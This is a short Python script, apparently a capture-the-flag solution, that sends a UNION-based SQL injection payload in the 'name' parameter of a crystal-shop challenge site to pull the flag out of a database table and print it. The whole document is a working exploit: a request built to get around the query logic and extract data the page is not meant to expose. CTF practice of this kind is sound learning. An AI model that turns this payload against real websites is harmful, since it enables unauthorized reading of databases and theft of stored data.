import requests

url = "https://walters-crystal-shop.chal.nbctf.com/crystals"

r = requests.get(url, params={"name":"a' union select flag,2,3 from flag-- -"})

print(r.text)